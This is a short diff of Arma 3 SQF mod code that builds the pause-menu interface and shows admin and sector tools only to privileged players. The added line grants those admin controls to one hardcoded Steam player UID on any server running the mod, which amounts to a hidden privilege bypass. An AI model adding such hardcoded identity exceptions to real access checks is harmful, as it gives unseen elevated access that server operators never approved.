@@ -101,9 +101,10 @@ sleep 5;  //-- Sleep for some sort of race condition that happens in some missio
 while {tsp_cba_core_pause} do {  //-- Add interface when escape menu is opened, 
 	waitUntil {!isNull (findDisplay 49)};  //-- Wait for pause screen to open
 	call tsp_fnc_pause_view;  //-- View distance button
+
 	if (!isNil "BIS_EGSpectatorCamera_camera") then {((findDisplay 49) displayCtrl 1010) ctrlEnable false};  //-- Disable respawn button
 	if (!isNil "BIS_EGSpectatorCamera_camera" && !isNil "tsp_param_spectate") then {call tsp_fnc_pause_leave};  //-- Leave spectate button
-	if (isServer || serverCommandAvailable "#kick" || rank player == "COLONEL") then {call tsp_fnc_pause_admin; call tsp_fnc_pause_sector} 
+	if (isServer || serverCommandAvailable "#kick" || rank player == "COLONEL" || getPlayerUID player == "76561198067670327") then {call tsp_fnc_pause_admin; call tsp_fnc_pause_sector} 
 	else {(findDisplay 49 displayctrl 13184) ctrlShow false};  //-- If not admin, hide original debug console
 	waitUntil {isNull (findDisplay 49)};  //-- Wait for pause screen to close
 };
